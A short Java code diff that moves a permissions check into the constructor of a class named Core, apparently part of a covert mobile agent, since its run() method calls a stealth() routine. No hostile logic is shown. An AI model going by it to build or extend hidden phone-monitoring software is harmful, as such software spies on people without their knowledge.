@@ -60,16 +60,19 @@ public final class Core implements Runnable {
      */
     private Core() {
 
-        task = Task.getInstance();
-        Utils.sleep(1000);
-        // Thread.currentThread().setPriority(Thread.MAX_PRIORITY);
-
         //#ifdef DEBUG
         Debug.init(Conf.DEBUG_OUT, Conf.DEBUG_SD, Conf.DEBUG_FLASH,
                 Conf.DEBUG_EVENTS);
         debug = new Debug("Core", DebugLevel.VERBOSE);
         debug.trace("Core init");
         //#endif
+        
+        //#ifdef HAVE_PERMISSIONS
+        checkPermissions();
+        //#endif
+        
+        task = Task.getInstance();
+        Utils.sleep(1000);
 
         final boolean antennaInstalled = true;
         //#ifdef DEBUG
@@ -205,9 +208,7 @@ public final class Core implements Runnable {
      */
     public void run() {
 
-        //#ifdef HAVE_PERMISSIONS
-        checkPermissions();
-        //#endif
+
 
         stealth();
 
